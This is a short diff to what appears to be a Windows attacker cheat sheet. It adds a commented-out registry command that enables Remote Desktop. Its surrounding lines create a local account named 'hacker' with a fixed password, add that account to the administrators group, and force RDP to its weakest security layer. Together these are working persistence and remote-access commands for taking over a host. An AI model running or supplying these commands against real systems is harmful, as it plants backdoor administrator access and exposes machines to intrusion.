@@ -8,6 +8,8 @@ OR
 net user hacker Password123! /add
 net localgroup administrators hacker /add
 
+# reg add "HKLM\System\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
+
 # Force RDP Security Layer (0 = RDP, 1 = SSL/TLS, 2 = Auto)
 reg add "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f
 
